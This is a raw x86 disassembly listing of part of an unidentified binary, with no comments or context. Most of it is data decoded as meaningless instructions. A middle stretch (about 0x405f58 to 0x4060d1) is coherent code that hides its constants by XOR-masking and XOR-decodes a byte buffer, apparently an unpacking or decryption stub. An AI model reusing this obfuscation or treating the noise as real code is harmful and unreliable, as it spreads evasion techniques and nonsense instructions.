  4059cc:	sub    edx,DWORD PTR [eax+0x6f]
  4059cf:	lahf   
  4059d0:	lods   eax,DWORD PTR ds:[esi]
  4059d1:	pop    esp
  4059d2:	xchg   BYTE PTR [edi+ebp*8],cl
  4059d5:	add    BYTE PTR ds:0xda477a39,0x61
  4059dc:	push   ecx
  4059dd:	or     cl,BYTE PTR [ecx]
  4059df:	retf   
  4059e0:	mov    eax,0xf1c68a4f
  4059e5:	cwde   
  4059e6:	(bad)  ds:[eax+ebx*8+0x141f40e4]
  4059ee:	push   edi
  4059ef:	xchg   edi,eax
  4059f0:	jne    0x4059b5
  4059f2:	lock dec ecx
  4059f4:	in     al,0x7d
  4059f6:	xchg   esp,eax
  4059f7:	and    eax,0xe81eec6c
  4059fc:	xor    eax,0xd36dfa1e
  405a01:	js     0x4059d7
  405a03:	xchg   esp,eax
  405a04:	sahf   
  405a05:	fsubr  QWORD PTR [edx]
  405a07:	popa   
  405a08:	into   
  405a09:	(bad)  
  405a0a:	dec    edi
  405a0b:	stc    
  405a0c:	add    DWORD PTR [ebp+0x5c],edx
  405a0f:	adc    DWORD PTR [edx+0x1f4932d2],esi
  405a15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a16:	or     DWORD PTR [ebx],esp
  405a18:	adc    eax,0x9faa192c
  405a1d:	xchg   BYTE PTR [edi-0x68],al
  405a20:	lea    ecx,[edi+0x2bd4cdd3]
  405a26:	in     eax,dx
  405a27:	lods   al,BYTE PTR ds:[esi]
  405a28:	call   0x9a76:0x65c6e537
  405a2f:	cmp    esp,ecx
  405a31:	jmp    0x73f9:0x12eb3f87
  405a38:	or     ecx,DWORD PTR [eax-0x2b42e7a2]
  405a3e:	and    eax,0xb5a086f9
  405a43:	das    
  405a44:	(bad)  
  405a45:	fcmovnbe st,st(5)
  405a47:	sub    DWORD PTR [ebx],0xffffffb3
  405a4a:	or     DWORD PTR [ebx+0x1ef8843],esi
  405a50:	inc    esi
  405a51:	iret   
  405a52:	mov    eax,0x251e6dc6
  405a57:	adc    al,bh
  405a59:	jnp    0x405a70
  405a5b:	(bad)  [esi-0x7]
  405a5e:	(bad)  
  405a5f:	fisubr DWORD PTR [ebx-0x455ee1c7]
  405a65:	add    ebp,DWORD PTR [edx]
  405a67:	inc    ecx
  405a68:	enter  0x8b81,0xc6
  405a6c:	aam    0x43
  405a6e:	aad    0x48
  405a70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a71:	pop    esi
  405a72:	popa   
  405a73:	jmp    0xfca7360f
  405a78:	pop    es
  405a79:	sahf   
  405a7a:	aas    
  405a7b:	scas   al,BYTE PTR es:[edi]
  405a7c:	inc    esp
  405a7d:	call   0x28fb:0x9c035f8d
  405a84:	xchg   esp,eax
  405a85:	push   esp
  405a86:	sbb    ch,dl
  405a88:	sub    bh,BYTE PTR [esi+0x6d]
  405a8b:	mov    dl,0x28
  405a8d:	lahf   
  405a8e:	jnp    0x405a43
  405a90:	xchg   ecx,eax
  405a91:	inc    edx
  405a92:	enter  0xcc9f,0xa0
  405a96:	(bad)  
  405a97:	scas   eax,DWORD PTR es:[edi]
  405a98:	mov    ecx,0x119aad86
  405a9d:	push   0xc81ac874
  405aa2:	jnp    0x405b0c
  405aa4:	cli    
  405aa5:	inc    bx
  405aa7:	jbe    0x405a42
  405aa9:	mov    BYTE PTR [ebp-0x547de60b],dl
  405aaf:	outs   dx,DWORD PTR ds:[si]
  405ab1:	imul   eax,DWORD PTR ds:0xe8f3455d,0x68
  405ab8:	inc    esi
  405ab9:	xlat   BYTE PTR ds:[ebx]
  405aba:	pop    ss
  405abb:	sbb    DWORD PTR [ebx],eax
  405abd:	mov    eax,0x934d0eb7
  405ac2:	or     ch,0x19
  405ac5:	add    DWORD PTR [eax+eax*2],ebp
  405ac8:	cli    
  405ac9:	sbb    DWORD PTR [esi+eax*8-0x18],0x12
  405ace:	adc    DWORD PTR ds:0x6abeb1e5,0x6dd1f6c0
  405ad8:	inc    eax
  405ad9:	fsubr  QWORD PTR [edx]
  405adb:	call   0xd69f:0xc71f0c7d
  405ae2:	mov    ch,0x6e
  405ae4:	das    
  405ae5:	push   ecx
  405ae6:	mov    al,ds:0xd87cdbca
  405aeb:	dec    edx
  405aec:	ja     0x405a7b
  405aee:	sti    
  405aef:	jae    0x405ae5
  405af1:	push   esp
  405af2:	push   0xffffffa8
  405af4:	loope  0x405ada
  405af6:	inc    ebp
  405af7:	mov    ebx,0xa66dce4
  405afc:	stc    
  405afd:	or     eax,0x31aec32b
  405b02:	lds    esi,FWORD PTR [ebp+0x37]
  405b05:	dec    edi
  405b06:	fs xor eax,0x4f39db8d
  405b0c:	fsubr  DWORD PTR [eax-0x57800a99]
  405b12:	add    dl,bl
  405b14:	dec    edx
  405b15:	and    BYTE PTR gs:[ebx-0x629e2ccd],ah
  405b1c:	jnp    0x405b01
  405b1e:	adc    bl,0xba
  405b21:	xor    al,0x92
  405b23:	ins    BYTE PTR es:[edi],dx
  405b24:	dec    eax
  405b25:	cmp    ecx,DWORD PTR [eax-0xec5cfb8]
  405b2b:	in     eax,dx
  405b2c:	add    bl,BYTE PTR [edi-0x3d]
  405b2f:	jbe    0x405b87
  405b31:	mov    bh,0xce
  405b33:	cmp    al,0x66
  405b35:	sbb    esi,DWORD PTR [edx]
  405b37:	push   es
  405b38:	xor    bl,BYTE PTR [ecx]
  405b3a:	xlat   BYTE PTR ds:[ebx]
  405b3b:	or     al,0x77
  405b3d:	int    0x4f
  405b3f:	inc    esi
  405b40:	xchg   esp,eax
  405b41:	int3   
  405b42:	and    al,0xa9
  405b44:	aad    0x2e
  405b46:	mov    eax,ds:0x64e4322c
  405b4b:	sbb    ebp,DWORD PTR [ecx]
  405b4d:	ins    DWORD PTR es:[edi],dx
  405b4e:	jnp    0x405b7e
  405b50:	pop    ds
  405b51:	call   0xf660acf2
  405b56:	dec    ebp
  405b57:	inc    edi
  405b58:	rol    DWORD PTR [ebx-0x47822bb5],1
  405b5e:	mov    ds:0x42e8ea51,eax
  405b63:	clc    
  405b64:	push   ds
  405b65:	enter  0x61d,0xe9
  405b69:	fidivr DWORD PTR [ebx-0x71]
  405b6c:	xlat   BYTE PTR ds:[ebx]
  405b6d:	dec    edx
  405b6e:	mov    ecx,0x27f4ca73
  405b73:	out    dx,eax
  405b74:	lods   eax,DWORD PTR ds:[esi]
  405b75:	jmp    0x9fb8:0x5def9ed8
  405b7c:	push   edx
  405b7d:	jae    0x405be1
  405b7f:	jae    0x405b0d
  405b81:	fld    DWORD PTR [edx-0x3a]
  405b84:	sbb    dl,BYTE PTR [edi+0x60864fc8]
  405b8a:	fistp  DWORD PTR [edx+0x62]
  405b8d:	mov    eax,ds:0x584a90f1
  405b92:	push   eax
  405b93:	cwde   
  405b94:	aaa    
  405b95:	lods   eax,DWORD PTR ds:[esi]
  405b96:	add    cl,bl
  405b98:	jns    0x405c09
  405b9a:	mov    esi,0xc2b126dc
  405b9f:	arpl   WORD PTR [ebx+0x667153e9],bx
  405ba5:	fst    DWORD PTR [edx+0x7e40adea]
  405bab:	mov    ?,eax
  405bad:	or     edi,DWORD PTR [edi-0x4353cea4]
  405bb3:	pop    ebx
  405bb4:	pop    ecx
  405bb5:	in     eax,0xe3
  405bb7:	cmp    eax,0x30d08aaa
  405bbc:	jne    0x405bfe
  405bbe:	out    dx,al
  405bbf:	mov    ah,0x45
  405bc1:	shr    edx,cl
  405bc3:	in     al,0xf7
  405bc5:	dec    esp
  405bc6:	mov    esp,0x53edb423
  405bcb:	ret    0xc7ad
  405bce:	cmp    BYTE PTR ds:0x2df9c6ff,cl
  405bd4:	xchg   ecx,eax
  405bd5:	jb     0x405c20
  405bd7:	pop    ebp
  405bd8:	mov    dl,0x1a
  405bda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bdb:	sti    
  405bdc:	cmp    al,cl
  405bde:	dec    esp
  405bdf:	fsub   QWORD PTR [ebx-0x26372f2c]
  405be5:	jbe    0x405bb9
  405be7:	sub    al,0xb3
  405be9:	adc    dh,dh
  405beb:	aam    0x85
  405bed:	add    bh,bh
  405bef:	jo     0x405c4c
  405bf1:	sub    BYTE PTR [esi],cl
  405bf3:	inc    ecx
  405bf4:	(bad)  
  405bf5:	into   
  405bf6:	pop    ss
  405bf7:	mov    edx,0xab1b079a
  405bfc:	push   cs
  405bfd:	jg     0x405c57
  405bff:	or     BYTE PTR [edi+0x23],ah
  405c02:	addr16 in eax,dx
  405c04:	dec    eax
  405c05:	push   ecx
  405c06:	mov    cl,0x59
  405c08:	fsubr  DWORD PTR [eax+0x20740289]
  405c0e:	cmp    ecx,ebx
  405c10:	mov    dl,0x7d
  405c12:	ffree  st(0)
  405c14:	call   0x844e:0xf26f17d4
  405c1b:	mov    dh,ah
  405c1d:	or     DWORD PTR [esp-0x76b9cd12],ecx
  405c24:	xor    eax,0xc0de1fd0
  405c29:	pop    ecx
  405c2a:	daa    
  405c2b:	jne    0x405c94
  405c2d:	mov    ds,WORD PTR [esi]
  405c2f:	xor    esp,DWORD PTR ds:[ebx+0x52]
  405c33:	scas   eax,DWORD PTR es:[edi]
  405c34:	and    bl,BYTE PTR [ebx-0x76]
  405c37:	push   0x10967c11
  405c3c:	fstp   TBYTE PTR [ebx-0x6040ab32]
  405c42:	pop    es
  405c43:	sti    
  405c44:	das    
  405c45:	retf   0x6323
  405c48:	inc    ecx
  405c49:	cs loop 0x405c13
  405c4c:	aaa    
  405c4d:	xchg   esp,eax
  405c4e:	mov    fs,WORD PTR [edx]
  405c50:	dec    ebp
  405c51:	shr    BYTE PTR [edi],0x92
  405c54:	sub    eax,0x877e808e
  405c59:	inc    esp
  405c5a:	das    
  405c5b:	pop    ebp
  405c5c:	push   esi
  405c5d:	mov    edi,0x330d0133
  405c62:	or     eax,0xc883890f
  405c67:	dec    edx
  405c68:	add    eax,DWORD PTR es:[esp+eiz*4+0x466797ed]
  405c70:	lods   eax,DWORD PTR ds:[esi]
  405c71:	loope  0x405c62
  405c73:	and    esp,esp
  405c75:	cmp    al,0x7e
  405c77:	sub    al,0xd9
  405c79:	call   0x1bcb3a
  405c7e:	mov    esp,0xd781dce5
  405c83:	push   es
  405c84:	or     DWORD PTR [ebx],edi
  405c86:	cmp    ebp,esp
  405c88:	sub    eax,0x97ce993b
  405c8d:	ror    al,cl
  405c8f:	sub    eax,0x3e1dfb71
  405c94:	inc    edi
  405c95:	push   edx
  405c96:	sbb    eax,0xd6289f5f
  405c9b:	(bad)  
  405c9c:	xor    ebx,eax
  405c9e:	or     edi,DWORD PTR [edi+0x17]
  405ca1:	dec    ebx
  405ca2:	inc    edx
  405ca3:	push   ecx
  405ca4:	sub    DWORD PTR [edi+0x72e0b4ae],edx
  405caa:	push   edx
  405cab:	jg     0x405c4a
  405cad:	pop    es
  405cae:	(bad)  
  405caf:	shl    BYTE PTR [eax+0x4657f522],cl
  405cb5:	pop    ebx
  405cb6:	enter  0x5b5e,0xb5
  405cba:	inc    edx
  405cbb:	(bad)  
  405cbc:	adc    BYTE PTR [esi-0x183d6553],ah
  405cc2:	repnz push esp
  405cc4:	xor    eax,DWORD PTR [ecx+0x2b]
  405cc7:	data16 jge 0x405d09
  405cca:	es sti 
  405ccc:	scas   eax,DWORD PTR es:[edi]
  405ccd:	test   al,0xeb
  405ccf:	out    0x9a,al
  405cd1:	fimul  DWORD PTR [ebx+ebp*1]
  405cd4:	xchg   ebx,eax
  405cd5:	mov    ebp,0x8598e0dd
  405cda:	dec    esi
  405cdb:	mov    ds:0x41c7a984,eax
  405ce0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ce1:	mov    esp,0x36196c6
  405ce6:	push   0x108b93d8
  405ceb:	and    eax,0xc5b0d85a
  405cf0:	mov    al,0xa3
  405cf2:	scas   eax,DWORD PTR es:[edi]
  405cf3:	push   ss
  405cf4:	and    eax,ebp
  405cf6:	int3   
  405cf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cf8:	inc    ebx
  405cf9:	and    ebp,eax
  405cfb:	lahf   
  405cfc:	xchg   BYTE PTR [ecx+0x53],bh
  405cff:	in     eax,0xca
  405d01:	scas   eax,DWORD PTR es:[edi]
  405d02:	mov    eax,DWORD PTR [ebx-0x1d97af48]
  405d08:	into   
  405d09:	ins    DWORD PTR es:[edi],dx
  405d0a:	sti    
  405d0b:	dec    ebx
  405d0c:	(bad)  
  405d0d:	or     al,0xb
  405d0f:	mov    eax,ds:0xf26b6640
  405d14:	jl     0x405d7d
  405d16:	loopne 0x405cc8
  405d18:	loop   0x405d22
  405d1a:	jae    0x405d7f
  405d1c:	shl    cl,cl
  405d1e:	repnz push 0x49
  405d21:	inc    edi
  405d22:	xchg   ebx,eax
  405d23:	cld    
  405d24:	jp     0x405cfa
  405d26:	push   ds
  405d27:	ja     0x405d5d
  405d29:	add    cl,dh
  405d2b:	push   0xffffff9f
  405d2d:	repnz jecxz 0x405d72
  405d30:	mov    ds:0xf1512fa2,eax
  405d35:	mov    ch,0x41
  405d37:	inc    ebp
  405d38:	in     al,0x1e
  405d3a:	xchg   ebx,eax
  405d3b:	xor    bh,al
  405d3d:	fdivr  DWORD PTR [esi+0x5872e9b1]
  405d43:	or     al,0x37
  405d45:	test   BYTE PTR [edx+0x21],ch
  405d48:	mov    edx,0x3c64bd2f
  405d4d:	neg    esi
  405d4f:	outs   dx,BYTE PTR ds:[esi]
  405d50:	sbb    ah,BYTE PTR [ebx+0x5101360d]
  405d56:	rol    dh,1
  405d58:	loope  0x405d32
  405d5a:	out    0x5c,eax
  405d5c:	jne    0x405d8a
  405d5e:	es inc eax
  405d60:	xor    ch,BYTE PTR [ecx]
  405d62:	mov    eax,0x29af3cf5
  405d67:	dec    ebx
  405d68:	mov    cl,0x8d
  405d6a:	push   ecx
  405d6b:	sti    
  405d6c:	imul   ebx,DWORD PTR [edx],0x39
  405d6f:	test   dl,0xec
  405d72:	data16 xlat BYTE PTR ds:[ebx]
  405d74:	mov    edx,0xbbe31b54
  405d79:	xchg   BYTE PTR [edi+0x5fec616d],dl
  405d7f:	jae    0x405d4a
  405d81:	sub    BYTE PTR [esi],0x90
  405d84:	pop    ebx
  405d85:	loopne 0x405d7f
  405d87:	rcr    DWORD PTR [esi-0x67],1
  405d8a:	pop    eax
  405d8b:	jne    0x405df5
  405d8d:	jecxz  0x405d84
  405d8f:	outs   dx,BYTE PTR ds:[esi]
  405d90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d91:	and    al,0x46
  405d93:	repnz cmp DWORD PTR [ebx+0x51aaf253],eax
  405d9a:	scas   al,BYTE PTR es:[edi]
  405d9b:	scas   al,BYTE PTR es:[edi]
  405d9c:	test   ah,dh
  405d9e:	xor    esp,DWORD PTR [ebp+0x49bec40]
  405da4:	pop    eax
  405da5:	pop    ecx
  405da6:	cmp    al,BYTE PTR [eax-0x66]
  405da9:	cdq    
  405daa:	push   eax
  405dab:	fst    QWORD PTR [eax+0x4d]
  405dae:	or     bh,0xe
  405db1:	imul   esi,DWORD PTR [eax],0x66b44a6a
  405db7:	inc    esp
  405db8:	dec    ebx
  405db9:	cwde   
  405dba:	retf   
  405dbb:	and    DWORD PTR [esi+0x779b1131],ebx
  405dc1:	in     al,dx
  405dc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405dc3:	xor    ebx,0x4bab7f23
  405dc9:	push   ebx
  405dca:	imul   edi,eax,0x7a
  405dcd:	and    al,0x17
  405dcf:	cdq    
  405dd0:	iret   
  405dd1:	aam    0x8f
  405dd3:	popa   
  405dd4:	pop    eax
  405dd5:	inc    esp
  405dd6:	aam    0xec
  405dd8:	mov    bh,al
  405dda:	int3   
  405ddb:	inc    edi
  405ddc:	je     0x405d82
  405dde:	scas   eax,DWORD PTR es:[edi]
  405ddf:	mov    ebp,0x9d8633f1
  405de4:	pop    ebx
  405de5:	(bad)  
  405de6:	fwait
  405de7:	sub    esp,DWORD PTR [ebp+0x48467a23]
  405ded:	stos   DWORD PTR es:[edi],eax
  405dee:	das    
  405def:	inc    esp
  405df0:	leave  
  405df1:	int3   
  405df2:	dec    esi
  405df3:	out    dx,al
  405df4:	lds    esi,FWORD PTR [ebp+ebx*4-0x26f812a]
  405dfb:	jae    0x405e2e
  405dfd:	mov    bl,0xba
  405dff:	inc    esi
  405e00:	adc    DWORD PTR [eax+0x6e],edi
  405e03:	sub    eax,DWORD PTR ds:0xb55809d2
  405e09:	pop    eax
  405e0a:	rol    BYTE PTR [esi-0x6e],0xfb
  405e0e:	mov    ebx,0x3b6c7629
  405e13:	mov    ebp,0xbc5bbc67
  405e18:	sbb    eax,0xc633b249
  405e1d:	ins    DWORD PTR es:[edi],dx
  405e1e:	test   DWORD PTR [ebx-0x6e],0x890de175
  405e25:	loopne 0x405e3c
  405e27:	shl    DWORD PTR [ebp+0x295d971d],1
  405e2d:	in     al,dx
  405e2e:	jae    0x405dff
  405e30:	mov    esp,0x23e944d5
  405e35:	add    DWORD PTR [esi+0x1e0a21cd],ebp
  405e3b:	sar    DWORD PTR [esi-0xc],1
  405e3e:	test   eax,0x94354b52
  405e43:	add    eax,0x7e669ad2
  405e48:	cld    
  405e49:	fisub  DWORD PTR [eax]
  405e4b:	mov    edx,edx
  405e4d:	cmp    BYTE PTR [eax-0x26],al
  405e50:	imul   BYTE PTR [esi+0x432b7663]
  405e56:	repnz div cl
  405e59:	icebp  
  405e5a:	sub    dh,BYTE PTR [esi+ebp*4]
  405e5d:	nop
  405e5e:	(bad)  
  405e5f:	xlat   BYTE PTR ds:[ebx]
  405e60:	mov    ch,0xe4
  405e62:	or     edx,DWORD PTR [eax*4-0x15d3c437]
  405e69:	xor    bh,0x1b
  405e6c:	sahf   
  405e6d:	dec    eax
  405e6e:	cld    
  405e6f:	loope  0x405e8f
  405e71:	ret    0xf290
  405e74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e75:	imul   ecx,DWORD PTR [edi-0x2294f134],0x7330fe12
  405e7f:	sub    eax,0xafdbc93
  405e84:	pop    eax
  405e85:	mov    ch,0x12
  405e87:	sbb    al,dl
  405e89:	stos   BYTE PTR es:[edi],al
  405e8a:	cmp    ebx,DWORD PTR cs:[esi-0x29]
  405e8e:	xor    esp,DWORD PTR ss:[edi+0x2e]
  405e92:	mov    ds:0x495840f5,eax
  405e97:	and    BYTE PTR [edi],bh
  405e99:	dec    edi
  405e9a:	popf   
  405e9b:	sar    DWORD PTR [edi-0x4e],0x9e
  405e9f:	adc    eax,esp
  405ea1:	push   ecx
  405ea2:	loopne 0x405e4b
  405ea4:	cmp    ah,BYTE PTR [ebx+0x54]
  405ea7:	gs add eax,0x7f34316a
  405ead:	fisub  WORD PTR [ebx]
  405eaf:	lea    ebp,[edi+0x1]
  405eb2:	not    DWORD PTR [edx-0x37a0c07b]
  405eb8:	jbe    0x405f11
  405eba:	into   
  405ebb:	jp     0x405e5f
  405ebd:	mov    dh,0x2
  405ebf:	jmp    0xc89a:0x12239996
  405ec6:	popf   
  405ec7:	fimul  DWORD PTR [edx-0x4b]
  405eca:	imul   ebx,DWORD PTR [edx+eax*2],0x4b0f1533
  405ed1:	or     DWORD PTR [ecx+0x43],edx
  405ed4:	or     eax,0x53de3cf2
  405ed9:	jle    0x405e61
  405edb:	pop    edi
  405edc:	jo     0x405eef
  405ede:	adc    DWORD PTR [edx],esp
  405ee0:	sbb    eax,0xfbd43d96
  405ee5:	(bad)  
  405ee6:	and    eax,DWORD PTR [edi-0x1bae7ef5]
  405eec:	sub    eax,0x7f62aa0c
  405ef1:	mov    edi,DWORD PTR [edx-0x39defeb]
  405ef7:	iret   
  405ef8:	int3   
  405ef9:	sbb    DWORD PTR [edi+0x20f0c6ff],edi
  405eff:	call   0x54001ea0
  405f04:	lds    ebp,FWORD PTR [edi-0x43]
  405f07:	test   al,0x4
  405f09:	scas   al,BYTE PTR es:[edi]
  405f0a:	mov    al,ds:0x18140701
  405f0f:	mov    edx,0x4089245
  405f14:	(bad)  
  405f15:	cmp    esp,esi
  405f17:	xor    ebx,DWORD PTR [ecx+0x2b914dfc]
  405f1d:	xor    dh,BYTE PTR [eax+0x5a41ee90]
  405f23:	in     al,dx
  405f24:	lea    ecx,[esp+edi*2+0x4b1533ac]
  405f2b:	dec    edi
  405f2c:	pop    ebp
  405f2d:	xlat   BYTE PTR ds:[ebx]
  405f2e:	mov    esi,0xebc235c4
  405f33:	push   0x68
  405f35:	stc    
  405f36:	mov    BYTE PTR [esp+esi*8],cl
  405f39:	mov    eax,0xc23625f9
  405f3e:	dec    ebp
  405f3f:	(bad)  
  405f40:	sub    ch,BYTE PTR [ecx-0x5dbb9dd6]
  405f46:	imul   ecx,DWORD PTR [ecx+0x458bd445],0x89c12ba8
  405f50:	inc    ebp
  405f51:	in     al,0x8b
  405f53:	inc    ebp
  405f54:	in     al,0x89
  405f56:	inc    ebp
  405f57:	in     al,dx
  405f58:	mov    eax,DWORD PTR [ebp-0x2c]
  405f5b:	mov    DWORD PTR [ebp-0x38],0xf89c85b5
  405f62:	mov    DWORD PTR [ebp-0x54],eax
  405f65:	mov    DWORD PTR [ebp-0x20],0xf89c85b4
  405f6c:	mov    eax,DWORD PTR [ebp-0x38]
  405f6f:	xor    eax,esi
  405f71:	add    eax,edi
  405f73:	mov    DWORD PTR [ebp-0x10],eax
  405f76:	mov    eax,DWORD PTR [ebp-0x38]
  405f79:	xor    eax,esi
  405f7b:	add    eax,edi
  405f7d:	mov    DWORD PTR [ebp-0x8],eax
  405f80:	mov    DWORD PTR [ebp-0x2c],0xf89c8595
  405f87:	mov    DWORD PTR [ebp-0x44],0xf89c85be
  405f8e:	mov    eax,DWORD PTR [ebp-0x38]
  405f91:	mov    edx,DWORD PTR [ebp-0x14]
  405f94:	xor    eax,esi
  405f96:	add    eax,edi
  405f98:	cmp    edx,eax
  405f9a:	je     0x40852b
  405fa0:	mov    eax,DWORD PTR [ebp-0x20]
  405fa3:	xor    eax,esi
  405fa5:	mov    edx,0xffcd8d06
  405faa:	sub    edx,eax
  405fac:	add    edx,DWORD PTR [ebp-0x14]
  405faf:	mov    eax,DWORD PTR [ebp-0x20]
  405fb2:	mov    ebx,DWORD PTR [ebp-0x10]
  405fb5:	xor    eax,esi
  405fb7:	add    eax,edi
  405fb9:	imul   eax,ebx
  405fbc:	cmp    eax,edx
  405fbe:	ja     0x408528
  405fc4:	mov    edx,DWORD PTR [ebp-0x10]
  405fc7:	mov    eax,DWORD PTR [ebp-0x14]
  405fca:	mov    ebx,DWORD PTR [ebp-0x2c]
  405fcd:	sub    eax,edx
  405fcf:	xor    ebx,esi
  405fd1:	xor    edx,edx
  405fd3:	add    ebx,edi
  405fd5:	div    ebx
  405fd7:	mov    DWORD PTR [ebp-0x8],eax
  405fda:	mov    eax,DWORD PTR [ebp-0x44]
  405fdd:	mov    edx,DWORD PTR [ebp-0x8]
  405fe0:	xor    eax,esi
  405fe2:	add    eax,edi
  405fe4:	cmp    edx,eax
  405fe6:	jbe    0x405ff6
  405fec:	mov    eax,DWORD PTR [ebp-0x44]
  405fef:	xor    eax,esi
  405ff1:	add    eax,edi
  405ff3:	mov    DWORD PTR [ebp-0x8],eax
  405ff6:	mov    eax,DWORD PTR [ebp-0x2c]
  405ff9:	mov    edx,DWORD PTR [ebp-0x8]
  405ffc:	xor    eax,esi
  405ffe:	add    eax,edi
  406000:	imul   eax,edx
  406003:	mov    DWORD PTR [ebp-0x8],eax
  406006:	mov    eax,DWORD PTR [ebp-0x38]
  406009:	mov    edx,DWORD PTR [ebp-0x8]
  40600c:	xor    eax,esi
  40600e:	add    eax,edi
  406010:	cmp    edx,eax
  406012:	je     0x408511
  406018:	mov    eax,DWORD PTR [ebp-0x8]
  40601b:	mov    DWORD PTR [ebp-0x18],eax
  40601e:	mov    eax,DWORD PTR [ebp-0x10]
  406021:	add    eax,DWORD PTR [ebp-0x54]
  406024:	mov    DWORD PTR [ebp-0x1c],0xf89c85b5
  40602b:	mov    DWORD PTR [ebp-0x8],eax
  40602e:	mov    eax,0xf89c85b4
  406033:	mov    DWORD PTR [ebp-0x28],eax
  406036:	mov    DWORD PTR [ebp-0x5c],0xf89c85bb
  40603d:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  406044:	mov    DWORD PTR [ebp-0x30],eax
  406047:	mov    eax,DWORD PTR [ebp-0x1c]
  40604a:	xor    eax,esi
  40604c:	add    eax,edi
  40604e:	jmp    0x4084cd
  406053:	mov    DWORD PTR [ebp-0x4c],0xf89c85a2
  40605a:	mov    DWORD PTR [ebp-0x50],0xf89c85af
  406061:	mov    eax,DWORD PTR [ebp-0x30]
  406064:	mov    edx,DWORD PTR [ebp-0xc]
  406067:	xor    eax,esi
  406069:	add    eax,edi
  40606b:	imul   eax,edx
  40606e:	mov    edx,DWORD PTR [ebp-0x8]
  406071:	mov    al,BYTE PTR [eax+edx*1]
  406074:	mov    BYTE PTR [ebp-0x1],al
  406077:	mov    eax,DWORD PTR [ebp-0x30]
  40607a:	mov    edx,DWORD PTR [ebp-0xc]
  40607d:	xor    eax,esi
  40607f:	add    eax,edi
  406081:	imul   eax,edx
  406084:	mov    edx,DWORD PTR [ebp-0x5c]
  406087:	xor    edx,esi
  406089:	add    eax,edx
  40608b:	mov    edx,DWORD PTR [ebp-0x8]
  40608e:	movzx  eax,BYTE PTR [eax+edx*1+0x3272fa]
  406096:	mov    edx,DWORD PTR [ebp-0x4c]
  406099:	xor    edx,esi
  40609b:	lea    eax,[edx+eax*1+0x3272fa]
  4060a2:	movzx  edx,BYTE PTR [ebp-0x1]
  4060a6:	xor    edx,eax
  4060a8:	mov    BYTE PTR [ebp-0x1],dl
  4060ab:	mov    al,BYTE PTR [ebp-0x1]
  4060ae:	mov    edx,DWORD PTR [ebp-0x30]
  4060b1:	mov    ebx,DWORD PTR [ebp-0xc]
  4060b4:	xor    edx,esi
  4060b6:	add    edx,edi
  4060b8:	imul   edx,ebx
  4060bb:	mov    ebx,DWORD PTR [ebp-0x8]
  4060be:	mov    BYTE PTR [edx+ebx*1],al
  4060c1:	mov    eax,DWORD PTR [ebp-0x30]
  4060c4:	mov    edx,DWORD PTR [ebp-0xc]
  4060c7:	xor    eax,esi
  4060c9:	add    eax,edi
  4060cb:	imul   eax,edx
  4060ce:	mov    edx,DWORD PTR [ebp-0x8]
  4060d1:	jmp    0x408469
  4060d6:	leave  
  4060d7:	pop    es
  4060d8:	xchg   DWORD PTR ds:0x47490549,eax
  4060de:	(bad)  
  4060df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060e0:	or     bl,cl
  4060e2:	gs scas al,BYTE PTR es:[edi]
  4060e4:	rol    BYTE PTR [ebx+0x7b7bc171],1
  4060ea:	hlt    
  4060eb:	pushf  
  4060ec:	jnp    0x406169
  4060ee:	cmp    al,0x1
  4060f0:	inc    esi
  4060f1:	lahf   
  4060f2:	retf   0xf4e4
  4060f5:	outs   dx,BYTE PTR ds:[esi]
  4060f6:	or     al,0x7
  4060f8:	es xchg ecx,eax
  4060fa:	retf   
  4060fb:	fistp  WORD PTR ds:0x818dcf1
  406101:	cmc    
  406102:	int3   
  406103:	mov    ds:0x164b81e0,al
  406108:	xchg   ebx,eax
  406109:	jge    0x4060f4
  40610b:	add    esp,DWORD PTR ds:0xc3965225
  406111:	jecxz  0x4060c4
  406113:	mov    cl,0xae
  406115:	scas   al,BYTE PTR es:[edi]
  406116:	mov    dh,0x39
  406118:	jmp    0x37579d48
  40611d:	out    0x81,eax
  40611f:	push   edi
  406120:	iret   
  406121:	shl    DWORD PTR [edi+0x55],cl
  406124:	mov    ebp,0x6202702f
  406129:	lods   eax,DWORD PTR ds:[esi]
  40612a:	pop    eax
  40612b:	cld    
  40612c:	mov    esp,ebp
  40612e:	xchg   esp,eax
  40612f:	shr    BYTE PTR [edi-0x58cce8d6],0xd8
  406136:	das    
  406137:	mov    ah,0x2b
  406139:	bound  edi,QWORD PTR [ebx]
  40613b:	pushf  
  40613c:	dec    eax
  40613d:	xchg   esi,eax
  40613e:	(bad)  
  40613f:	sahf   
  406140:	mov    esp,0xeb2a7f10
  406145:	cmp    al,0x6f
  406147:	pop    ecx
  406148:	xchg   ebp,eax
  406149:	sub    ecx,esp
  40614b:	fnsave [esp+eiz*2-0x72b50c92]
  406152:	mov    BYTE PTR [edx-0x73077519],0xad
  406159:	int    0xed
  40615b:	inc    eax
  40615c:	dec    eax
  40615d:	and    edi,DWORD PTR ds:0xfe3ddd4a
  406163:	sub    al,0x39
  406165:	jmp    0xd124:0xbe19edf8
  40616c:	sbb    dl,BYTE PTR [ecx+0x24f050ef]
  406172:	loop   0x406183
  406174:	sar    DWORD PTR [esi],0xb8
  406177:	and    BYTE PTR [ebp+edi*2+0x3f],ch
  40617b:	stos   DWORD PTR es:[edi],eax
  40617c:	mov    BYTE PTR [edx+0x32a9f5a3],bl
  406182:	cmp    eax,0x8fb35b1e
  406187:	dec    eax
  406189:	jns    0x4061f7
  40618b:	xlat   BYTE PTR ds:[ebx]
  40618c:	xchg   edx,eax
  40618d:	xor    ch,BYTE PTR [eax+eiz*2]
  406190:	lea    eax,[edi+ebx*8-0x2a3b1ba5]
  406197:	std    
  406198:	mov    esp,0x3bfb2ad7
  40619d:	je     0x406186
  40619f:	daa    
  4061a0:	sahf   
  4061a1:	icebp  
  4061a2:	or     edi,ecx
  4061a4:	mov    ch,0xcf
  4061a6:	les    ecx,FWORD PTR ds:0x38a9cedd
  4061ac:	test   DWORD PTR [edi+0x173dc9b8],ebp
  4061b2:	or     eax,ebp
  4061b4:	arpl   WORD PTR [ebx+0x4c],di
  4061b7:	cmc    
  4061b8:	push   ebp
